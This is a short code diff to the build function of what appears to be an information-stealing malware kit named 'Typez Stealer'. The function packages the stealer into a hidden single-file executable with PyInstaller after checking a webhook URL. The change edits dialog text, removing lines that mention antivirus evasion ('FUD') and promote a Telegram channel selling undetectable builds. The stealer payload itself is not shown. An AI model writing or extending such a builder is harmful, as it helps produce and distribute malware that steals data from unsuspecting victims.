@@ -61,7 +61,7 @@ def build_exe():
         else:
             icon_option = ''
 
-        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - https://t.me/TypezStealer"
+        message = "Build process started. This may take a while..."
         messagebox.showinfo("Information", message)
 
         # Customizing PyInstaller build command
@@ -69,7 +69,7 @@ def build_exe():
         build_command = f'pyinstaller Typez.py --noconsole --onefile{icon_option}'
         os.system(build_command)
 
-        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
+        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo!")
     else:
         messagebox.showerror("Error", "Invalid webhook URL!")
 
